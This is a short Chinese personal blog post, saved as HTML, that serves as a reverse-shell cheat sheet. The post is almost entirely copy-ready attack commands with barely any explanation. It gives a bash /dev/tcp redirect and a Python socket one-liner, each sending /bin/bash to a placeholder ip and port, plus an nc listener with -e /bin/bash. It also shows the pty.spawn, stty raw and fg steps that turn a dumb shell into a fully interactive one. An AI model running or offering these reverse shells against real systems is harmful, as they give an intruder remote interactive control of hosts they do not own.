<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8" />
  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
  <title>
    
    反弹shell 丨
    

    le0
  </title>

  
  <link rel="shortcut icon" href="/icon.svg">
  

  <link rel="preconnect" href="https://cdnjs.cloudflare.com">
  
  <link id="theme" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-light.css">
  <script src="https://unpkg.com/@highlightjs/cdn-assets@11.9.0/highlight.min.js"></script>
  

  <!-- 字体 -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">

  
<link rel="stylesheet" href="/css/root.css">

  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/post.css">

<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  <header class="header">
  <section class="header-container">
    <a class="logo" href="/">Le0的随便写写</a>
    <ul class="nav">
      
      <li><a href="/archives">archives</a></li>
      
    </ul>
  </section>
</header>
  <main class="main">
    <article class="post">
  
  <div class="post-title">反弹shell</div>
  <div class="post-meta">
    <div class="date">2024 November 21st</div>
    <div class="tags">
      
      <div class="tag-item">安全技术</div>
      
    </div>
  </div>
  

  <main class="post-content"><h3 id="哑shell变交互shell"><a href="#哑shell变交互shell" class="headerlink" title="哑shell变交互shell"></a>哑shell变交互shell</h3><p>具体如下，第一步，在哑 shell 中执行：<br><code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br>键入 Ctrl-Z，回到 VPS 的命令行中；第二步，在 VPS 中执行：<br><code>stty raw -echo</code><br><code>fg</code></p>
<p>回到哑 shell 中；第三步，在哑 shell 中键入 Ctrl-l，执行：</p>
<pre><code class="highlight plaintext">$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows 54 columns 104</code></pre>

<p>这样，可以得到功能齐全的交互式 shell，比如，支持命令补全、语法高亮：</p>
<p><img src="/images/Reshell/reshell1.png" alt="《linux反弹shell以及哑shell变为交互式shell》"></p>
<h3 id="NC-接收"><a href="#NC-接收" class="headerlink" title="NC 接收"></a>NC 接收</h3><ul>
<li>nc -lvp 7777 -e &#x2F;bin&#x2F;bash</li>
</ul>
<h3 id="bash反弹"><a href="#bash反弹" class="headerlink" title="bash反弹"></a>bash反弹</h3><ul>
<li>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1</li>
</ul>
<h3 id="python反弹"><a href="#python反弹" class="headerlink" title="python反弹"></a>python反弹</h3><p><code>python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;ip&#39;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#39;/bin/bash&#39;,&#39;-i&#39;]);&quot;</code></p>
<p><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code><br>这个代码片段用于在非交互式 Shell 中获取一个更完整的交互式环境，通常用于提升命令行体验。</p>
</main>

</article>


<script src="/js/highlight.js"></script>

  </main>
  <footer class="footer">
  
  <span>Copyright © 2024 typole0</span>
  
</footer>
  
<script src="/js/theme.js"></script>

</body>

</html>